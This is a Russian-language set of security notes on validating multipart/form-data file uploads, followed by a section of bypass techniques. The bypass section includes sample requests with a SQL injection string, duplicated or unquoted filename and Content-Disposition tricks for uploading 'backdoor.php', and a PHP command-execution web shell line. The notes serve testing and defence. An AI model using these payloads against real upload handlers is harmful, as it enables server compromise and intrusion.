https://datatracker.ietf.org/doc/html/rfc6266

Практически все SDK для загрузки файлов, плагины, библиотеки и т. д. содержат инструменты и функции для проверки того,
что пользователь собирается загрузить. Например, распространённая проверка заключается в проверке типа содержимого, 
расширения файла или наличия магических байтов в начале тела файла. 
Другой пример — проверка длины части файла, чтобы принимать только файлы меньше определённого размера.
Всегда следует помнить, что для веб-приложений x-www-form-urlencodedи multipart/form-dataявляются взаимозаменяемыми, и уязвимости одного из этих двух парсеров могут привести к проблемам безопасности. 

1. Проверка расширения файла: убедитесь, что файл имеет допустимое расширение (например, .jpg, .png, .gif).
2. Проверка типа MIME: Проверьте заголовок Content-Type в запросе на загрузку файла, чтобы убедиться, 
что он соответствует ожидаемому типу MIME для расширения файла. 
Например, файл изображения должен иметь тип MIME, например image/jpeg, image/png.
3. Проверка магических байтов: анализ магических байтов файла (что-то вроде байтов сигнатуры в начале файла) для подтверждения его фактического формата, 
независимо от предоставленного расширения или типа MIME.
4. Ограничение размера файла: убедитесь, что размер файла не превышает заданных ограничений.
5. Проверка на вирусы и вредоносное ПО - через ICAP протокол
6. Проверка содержимого (обычно с помощью WAF) проверьте имя файла на наличие недопустимых символов и последовательностей, таких как ../

Понимание многокомпонентных форм-данных:
application/x-www-form-urlencoded - кодирует поля формы как пары «ключ-значение», закодированные в URL, что хорошо подходит для простых текстовых данных
multipart/form-data - работа с двоичными данными или файлами. Он разбивает данные формы на несколько частей, каждая из которых разделена уникальной строкой-разделителем
```
--boundary
Content-Disposition: form-data; name="username"

foo
--boundary
Content-Disposition: form-data; name="password"
```

### Атаки
##### URL-кодирование в multipart
Один из самых простых, но эффективных методов обхода заключается в переключении типа содержимого запроса с URL-кодированного на multipart multipart/form-data
```
...
Content-Type: multipart/form-data; boundary=xxx

--xxx
Content-Disposition: form-data; name="email";
foo@bar' OR 1=1-- &email=foo@bar&aaa # атака простая - тупо делает URL кодировку в теле запроса
--xxx--
```

##### дублирование параметра имени
Другой способ обойти валидацию входных данных — дублирование nameпараметра в Content-Dispositionзаголовке составного запроса. 
```
--xxx
Content-Disposition: form-data; name="file"; filename="a.txt"; filename="backdoor.php"

<?php system("id"); ?>
--xxx--
```

##### дублирование Content-Disposition
То же, что и для метода выше, но с дублированием Content-Dispositionзаголовка.
```
--boundary
Content-Disposition: form-data; name="file"; filename="safe.txt"
Content-Disposition: form-data; name="file"; filename="malicious.php"

<file content>
--boundary--
```

##### разрыв последовательностей CRLF
Многие парсеры ищут определённую последовательность CRLF \r\n\r\nдля определения конца заголовков и начала тела в многокомпонентном сообщении
```
Content-Type: text/plain\n # убираем \r из конца сообщения и обходим логику
\r\n
<?php system('id'); ?>\r\n
```

##### удаление двойных кавычек
Изменение синтаксиса заголовка Content-Dispositionпутем удаления двойных кавычек вокруг параметров или замены их одинарными
В стандартном multipart/form-dataзапросе параметры, такие как nameи filenameв Content-Dispositionзаголовке, обычно заключаются в двойные кавычки. Например: name="file"или filename="image.png".
```
--boundary
Content-Disposition: form-data; name="file"; filename=backdoor.php # убрали кавычки обрамляющие backdoor.php

<file content>
--boundary--
```

##### отсутствует закрывающая граничная строка
само сообщение завершается символом --<boundary string>--. Однако, если злоумышленник удалит закрывающую граничную строку, многие приложения всё равно смогут её принять
```
Content-Disposition: form-data; name="file"; filename="malicious.php"

<file content>
# тут должен быть --boundary--, но его нет)
```

##### filename*=utf-8''по запросу
RFC 6266 обновил RFC 2616, где:
когда в одном поле заголовка присутствуют и "filename", и "filename*", получателям СЛЕДУЕТ выбирать "filename*" и игнорировать "filename".
По сути, этот filename*параметр позволяет включать в имена файлов специальные символы и указывать кодировку
```
Content-Disposition: form-data; name="file"; filename*=utf-8''file%2ephp # file.php
Content-Disposition: form-data; name="file"; filename*=utf-8''file%2esh # file.sh 
```
